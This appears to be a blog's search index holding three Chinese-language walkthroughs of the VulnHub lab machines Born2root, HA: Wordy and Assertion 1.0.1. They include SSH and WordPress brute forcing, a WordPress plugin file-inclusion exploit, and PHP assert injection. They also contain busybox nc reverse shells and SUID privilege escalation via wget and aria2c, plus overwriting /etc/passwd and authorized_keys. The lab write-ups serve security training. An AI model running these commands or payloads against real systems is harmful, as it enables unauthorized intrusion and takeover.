+    <content><![CDATA[<h1 id="Born2root-Walkthrough"><a href="#Born2root-Walkthrough" class="headerlink" title="Born2root Walkthrough"></a>Born2root Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[Born2Root: 1](<a href="https://www.vulnhub.com/entry/born2root-1,197/">Born2Root: 1 ~ VulnHub</a>)</p>
+<p><img src="/picture/image-20250323173030438.png" alt="image-20250323173030438"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.98  </span><br></pre></td></tr></table></figure>
+
+<p>发现 22，80，111，38734 端口</p>
+<p><img src="/picture/image-20250323103653485.png" alt="image-20250323103653485"></p>
+<p>在进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80,111,38734 -A -T4 172.16.33.98</span><br></pre></td></tr></table></figure>
+
+<p>也是发现了 80 端口的 robots.txt ，同时发现高位端口的服务还是不明</p>
+<p><img src="/picture/image-20250323103810069.png" alt="image-20250323103810069"></p>
+<p>先来看看 22 端口，直接使用 ssh 客户端连接，尝试弱口令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.98  </span><br></pre></td></tr></table></figure>
+
+<p>可惜的是连接上了 ssh ，并未泄露什么信息，同时弱口令也行不通</p>
+<p><img src="/picture/image-20250323104428522.png" alt="image-20250323104428522"></p>
+<p>再来看看 80 端口，先前 nmap 扫到了 robots.txt ，直接访问是两个网站 </p>
+<p>&#x2F;wordpress-blog 纯是干扰信息，逗你玩的</p>
+<p><img src="/picture/image-20250323104615308.png" alt="image-20250323104615308"></p>
+<p>&#x2F;files 也是空的</p>
+<p><img src="/picture/image-20250323104659011.png" alt="image-20250323104659011"></p>
+<p>那么扫描目录看看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.98/</span><br></pre></td></tr></table></figure>
+
+<p>换了好些字典，也只扫出来了 &#x2F;files ，&#x2F;icons，&#x2F;manual 和 robots.txt </p>
+<p>在 &#x2F;icons 下发现了 VDSoyuAXiO.txt 可疑文件，访问发现是 RSA PRIVATE KEY，但是并不知道这个 key 的用户名是谁</p>
+<p><img src="/picture/image-20250323105621435.png" alt="image-20250323105621435"></p>
+<p>而 &#x2F;manual 是 Apache HTTP 服务器 2.4 的文档，没有提供用户名信息，那我们直接访问 ip 试试看</p>
+<p>发现了三个用户名：martin，hadi，jimmy 和邮箱地址 <code>martin@secretsec.com</code>  </p>
+<p><img src="/picture/image-20250323110327281.png" alt="image-20250323110327281"></p>
+<p>将各用户名配合泄露的密钥尝试 ssh 登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i private.key martin@172.16.33.98</span><br><span class="line">ssh -i private.key hadi@172.16.33.98</span><br><span class="line">ssh -i private.key jimmy@172.16.33.98</span><br></pre></td></tr></table></figure>
+
+<p>可惜都失败了，80 端口似乎没有路子了，再来看看 111 端口，尝试登陆和用户名登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient 172.16.33.98</span><br><span class="line">rpcclient --user jimmy 172.16.33.98</span><br><span class="line">rpcclient --user hadi 172.16.33.98</span><br><span class="line">rpcclient --user martin 172.16.33.98</span><br></pre></td></tr></table></figure>
+
+<p>都报了 Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED 错，意思是目标主机虽然开启了 111 端口 NFS 服务，但不接受登录请求</p>
+<p><img src="/picture/image-20250323154952588.png" alt="image-20250323154952588"></p>
+<p>既然不让我们登陆，那我们拿他也没什么办法，那只能试试 SSH 密码爆破了，毕竟有三个用户名</p>
+<p>将三个用户名保存为用户名字典 user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>s 参数会将用户名当成密码尝试</p>
+<p>r 会使用倒置的用户名当作密码尝试</p>
+<p>n 使用空密码</p>
+</blockquote>
+<p>密码字典也可以使用 cewl 在目标网站进行爬取后生成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl 172.16.33.98 -m 4 -w pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>开始密码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P pass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>
+
+<p>可惜没跑出来</p>
+<p><img src="/picture/image-20250323160928271.png" alt="image-20250323160928271"></p>
+<p>试试对 pass.txt 进行变形操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat --stdout pass.txt -r /usr/share/hashcat/rules/combinator.rule -o newpass.txt</span><br></pre></td></tr></table></figure>
+
+<p>再使用新的密码跑一遍看看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P newpass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>
+
+<p>密码为 hadi123 </p>
+<p><img src="/picture/image-20250323164351354.png" alt="image-20250323164351354"></p>
+<p>直接 ssh 登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh hadi@172.16.33.98</span><br></pre></td></tr></table></figure>
+
+<p>登陆成功</p>
+<p><img src="/picture/image-20250323162853128.png" alt="image-20250323162853128"></p>
+<p>接下来就是提权，比较搞的时，su 的密码也是 hadi123 ，直接就变成 root 了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250323172852355.png" alt="image-20250323172852355"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HAWordy Walkthrough</title>
+    <url>/2025/03/24/HAWordy/</url>
+    <content><![CDATA[<h1 id="HA-Wordy-Walkthrough"><a href="#HA-Wordy-Walkthrough" class="headerlink" title="HA: Wordy Walkthrough"></a>HA: Wordy Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/ha-wordy,363/">HA: Wordy</a> </p>
+<p><img src="/picture/image-20250322192153885.png" alt="image-20250322192153885"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 172.16.33.108             </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:21 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
+
+<p>看来目标主机只开放了 80 端口，进一步做应用版本发现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p 80 -A -T4 172.16.33.108 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<p>80 开放的是 Apache httpd 服务，版本为 2.4.29 ，过高，漏洞较难利用，接下来尝试进行 WEB 目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.108/</span><br></pre></td></tr></table></figure>
+
+<p>发现 wp 目录和登陆界面，猜测是 wp 构建的网站，同时发现 info.php ，但内容仅为目标主机 IP</p>
+<p><img src="/picture/image-20250322114239464.png" alt="image-20250322114239464"></p>
+<p>访问 &#x2F;wordpress&#x2F;wp-login.php ，尝试输入账户名和密码，发现存在用户名枚举漏洞，存在 admin 账户</p>
+<p><img src="/picture/image-20250322114635271.png" alt="image-20250322114635271"></p>
+<p><img src="/picture/image-20250322114713974.png" alt="image-20250322114713974"></p>
+<p>用户名确定，可以试试密码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 172.16.33.108 http-post-form &#x27;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F172.16.33.108%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>发送的参数可以在开发者工具中的 NetWork 中找到</p>
+<p><img src="/picture/image-20250322114916400.png" alt="image-20250322114916400"></p>
+<p>可惜，rockyou 没跑出来，说明密码十分复杂</p>
+<p><img src="/picture/image-20250322115026326.png" alt="image-20250322115026326"></p>
+<p>既然是 wp 构建的，使用 wpscan 扫扫看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.108/wordpress --enumerate u,ap,at --disable-tls-checks</span><br></pre></td></tr></table></figure>
+
+<p>发现了一些目录：</p>
+<p><img src="/picture/image-20250322132718031.png" alt="image-20250322132718031"></p>
+<p>访问 readme ，只是一个下载引导页面</p>
+<p><img src="/picture/image-20250322132911433.png" alt="image-20250322132911433"></p>
+<p>再来看主题，为 twentysixteen Version: 2.0，提示似乎有点过时了</p>
+<p><img src="/picture/image-20250322133149081.png" alt="image-20250322133149081"></p>
+<p>去网上搜搜看对应版本是否有漏洞，可惜没有搜索到</p>
+<p>再来看插件，分别是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-masta version 1.0</span><br><span class="line">reflex-gallery Version: 3.1.3</span><br><span class="line">site-editor Version: 1.1.1</span><br><span class="line">slideshow-gallery Version: 1.4.6</span><br><span class="line">wp-easycart-data (?)</span><br><span class="line">wp-support-plus-responsive-ticket-system Version: 7.1.3</span><br><span class="line">wp-symposium Version: 15.1</span><br></pre></td></tr></table></figure>
+
+<p>我们一个一个来，先是 mail-masta ，幸运的是，在 <a href="https://www.exploit-db.com/exploits/40290">WordPress Plugin Mail Masta 1.0 - Local File Inclusion</a> 页面能找到对应版本漏洞利用代码，而且通过 wpscan 的扫描我们得知，该 wp 服务的文件上传路径是默认的 &#x2F;wp-content 目录，那么就可以直接利用代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/picture/image-20250322140134547.png" alt="image-20250322140134547"></p>
+<p>看看能不能包含 apache 服务日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
+
+<p>可以包含，那么就尝试 apache 日志包含，可惜失败了，尝试通过伪协议执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p><img src="/picture/image-20250322143747568.png" alt="image-20250322143747568"></p>
+<p>尝试反弹 shell </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+
+<p>同时开启 nc 监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+
+<p>反弹成功</p>
+<p><img src="/picture/image-20250322144039742.png" alt="image-20250322144039742"></p>
+<p>在 &#x2F;home&#x2F;raj 目录下找到第一个 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322172934353.png" alt="image-20250322172934353"></p>
+<p>接下来就是提权，在工作目录下的 &#x2F;html 目录中，发现可疑文件，意思是需要 ZIP 来解决</p>
+<p><img src="/picture/image-20250322145304048.png" alt="image-20250322145304048"></p>
+<p>本机编写接收程序，将 zip 文件上传到宿主机上</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(post_data)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), UploadHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>启动接受服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 upload_server.py</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --post-file=secret.zip --header=&quot;Content-Type: application/octet-stream&quot; http://172.16.33.108:8000/</span><br></pre></td></tr></table></figure>
+
+<p>接收成功，解压时发现需要密码</p>
+<p><img src="/picture/image-20250322153224623.png" alt="image-20250322153224623"></p>
+<p>将密码哈希保存为字典，使用 john 破译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john secret.zip &gt; secret.txt  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</span><br></pre></td></tr></table></figure>
+
+<p>又没跑出密码，看来得在目标主机里找了（</p>
+<p><img src="/picture/image-20250322153600657.png" alt="image-20250322153600657"></p>
+<p>再来枚举其他信息，看看有什么文件具有 SUID 权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>看到了一个有趣的东西：</p>
+<p><img src="/picture/image-20250322181011381.png" alt="image-20250322181011381"></p>
+<p>尝试使用 wget 的 SUID 提权，由于需要写入文件，所以进入 tmp 目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@ubuntu:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ wget --use-askpass=<span class="variable">$TF</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>利用成功</p>
+<p><img src="/picture/image-20250322181324853.png" alt="image-20250322181324853"></p>
+<p>接下来就是进入 root 目录获得最终 flag</p>
+ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="comment"># cat proof.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322181504137.png" alt="image-20250322181504137"></p>
+<p>或者可以使用 cp 命令</p>
+<p>将目标主机上的 &#x2F;etc&#x2F;passwd 文件内容拷贝至主机，生成已知的密码哈希（123）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
+
+<p>在本地生成 passwd 文件，通过 goshs 上传至目标主机 tmp 目录，将上传的 passwd 拷贝覆盖原 &#x2F;etc&#x2F;passwd ，最后经过 su 提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su # 输入密码 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322202054503.png" alt="image-20250322202054503"></p>
+<p>当然，直接 wget 覆盖 &#x2F;etc&#x2F;passwd 也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 看来 secret.zip 是兔子洞，误导你的</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Assertion101 Walkthrough</title>
+    <url>/2025/03/22/Assertion101/</url>
+    <content><![CDATA[<h1 id="Assertion-1-0-1-Walkthrough"><a href="#Assertion-1-0-1-Walkthrough" class="headerlink" title="Assertion: 1.0.1 Walkthrough"></a>Assertion: 1.0.1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/assertion-101,495/#top">Assertion: 1.0.1</a></p>
+<p><img src="/picture/image-20250324142845574.png" alt="image-20250324142845574"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.99</span><br></pre></td></tr></table></figure>
+
+<p>发现 22、80 端口</p>
+<p><img src="/picture/image-20250324143056755.png" alt="image-20250324143056755"></p>
+<p>对开放的端口做应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80 -A -T4 172.16.33.99</span><br></pre></td></tr></table></figure>
+
+<p>发现 SSH 和 Apache 服务版本较高，漏洞较少且利用复杂，暂不考虑</p>
+<p><img src="/picture/image-20250324143630111.png" alt="image-20250324143630111"></p>
+<p>先来看 22 端口，尝试直接连接以及弱口令能不能泄露机密信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.99 </span><br></pre></td></tr></table></figure>
+
+<p>很遗憾，失败了，什么也没泄露</p>
+<p><img src="/picture/image-20250324143811794.png" alt="image-20250324143811794"></p>
+<p>试试 SSH 爆破 root 密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l root -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.99</span><br></pre></td></tr></table></figure>
+
+<p>没爆破出来</p>
+<p>好吧，看来 22 端口暂时无从下手了，再来看看 80 端口</p>
+<p>进行下 WEB 目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.99  </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/wordlists/dirb/big.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/big.txt </span><br></pre></td></tr></table></figure>
+
+<p>说实话，后面几个加了字典的还没不加字典的第一个扫出来的多</p>
+<p><img src="/picture/image-20250324144159467.png" alt="image-20250324144159467"></p>
+<p>访问页面，你会发现他的超链接做的挺乱的，就以 about 那个页面来说，网站上有三种通向该页面的超链接，但也只有前两种有用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=about</span><br><span class="line">http://172.16.33.99/about.php</span><br><span class="line">http://172.16.33.99/about.html</span><br></pre></td></tr></table></figure>
+
+<p>探寻页面一会后，你会发现，home 、about us、schedule、gallery、blog、contains 这几个页面站内所有链接的 action 都是 # ，说明是无用链接</p>
+<p><img src="/picture/image-20250324144732104.png" alt="image-20250324144732104"></p>
+<p>再来看看 &#x2F;pages 目录，发现刚好与网页各个展示内容对应</p>
+<p><img src="/picture/image-20250324145849180.png" alt="image-20250324145849180"></p>
+<p>结合 <code>http://172.16.33.99/index.php?page=about</code> ，可以大胆猜测一下，是否存在文件包含？</p>
+<p>尝试包含 &#x2F;etc&#x2F;passwd 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>噢？看来是对关键词做了过滤</p>
+<p><img src="/picture/image-20250324150045976.png" alt="image-20250324150045976"></p>
+<p>生成长度为一的关键词字典</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch 1 1 -f /usr/share/crunch/charset.lst symbols-all &gt; s.txt </span><br></pre></td></tr></table></figure>
+
+<p>测试一下有哪些关键词被过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w s.txt:VAL -u http://172.16.33.99/index.php?page=VAL -fr &quot;File does not exist&quot;</span><br></pre></td></tr></table></figure>
+
+<p>嗯？还有意外之喜，单引号既然会引起服务端错误，要么是 SQL 注入，要么是命令注入</p>
+<p>这里显然不是 SQL 注入，因为响应的页面为空，执行 <code>&#39; or 1=1 #</code> 的响应也为空</p>
+<p><img src="/picture/image-20250324151407818.png" alt="image-20250324151407818"></p>
+<p>那么就是关于 PHP 内容的命令注入，我们可以将核心代码看成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$page</span>&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>输入的单引号会破坏原语句的结构，导致响应 500</p>
+<p>尝试插入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;id&quot;)) or &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>语句就变成了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;&#x27;and die(system(&quot;</span>id<span class="string">&quot;)) or &#x27;&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>就可以执行命令</p>
+<p><img src="/picture/image-20250324152258829.png" alt="image-20250324152258829"></p>
+<p>能执行命令就简单了，直接使用 busybox 反弹 shell </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;busybox nc 10.8.0.90 1234 -e /bin/bash&quot;)) or &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/picture/image-20250324152503892.png" alt="image-20250324152503892"></p>
+<p>接下来是提权，查看 sudo 版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure>
+
+<p>1.8.21 处在 1.8.2 ~ 1.8.31p2 直接，可以使用 CVE-2021-3156 提权</p>
+<p><img src="/picture/image-20250324152621815.png" alt="image-20250324152621815"></p>
+<p>切换到 &#x2F;tmp 目录，将 exp 上传至目标主机，赋予可执行权限后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/picture/image-20250324152956639.png" alt="image-20250324152956639"></p>
+<p>切换至 cd 目录，获得 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root </span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250324153219933.png" alt="image-20250324153219933"></p>
+<p>当然，也可以通过 aria2c 的 SUID 权限提权，该文件与 wget 相似，可以远程下载文件</p>
+<p><img src="/picture/image-20250324153523310.png" alt="image-20250324153523310"></p>
+<p>那么就将目标主机上的 &#x2F;etc&#x2F;passwd 文件拷贝到宿主机，将 root 密码更改为已知，再通过 aria2c 远程下载并覆盖原 &#x2F;etc&#x2F;passwd</p>
+<p>由于具有 SUID 的文件运行时会获得 root 权限，所以可以允许修改 &#x2F;etc&#x2F;passwd </p>
+<p>生成已知的密码哈希（123）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
+
+<p>更改后的 passwd</p>
+<p><img src="/picture/image-20250324154812796.png" alt="image-20250324154812796"></p>
+<p>执行下载命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -o &quot;/etc/passwd&quot; &quot;http://10.8.0.90/passwd&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure>
+
+<p>直接使用 su 提权</p>
+<p><img src="/picture/image-20250324160332053.png" alt="image-20250324160332053"></p>
+<p>也可以制作 SSH 公钥直接写入 root 账号根目录下，然后我在用我的私钥直接和目标主机服务端 SSH 建立连接</p>
+<p>生成 ssh 公私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250324161554295.png" alt="image-20250324161554295"></p>
+<blockquote>
+<p>直接一路回车就行，生成的公私钥在 .ssh 目录</p>
+</blockquote>
+<p><img src="/picture/image-20250324160802504.png" alt="image-20250324160802504"></p>
+<p>将公钥上传至 root 账号根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -d /root/.ssh/ -o authorized_keys &quot;http://10.8.0.90/id_rsa.pub&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250324161339594.png" alt="image-20250324161339594"></p>
+<p>再宿主机 .ssh 目录使用 SSH 远程登陆</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/.ssh]</span><br><span class="line">└─$ ssh root@172.16.33.99   </span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/picture/image-20250324161449534.png" alt="image-20250324161449534"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
       </tags>
   </entry>
 </search>
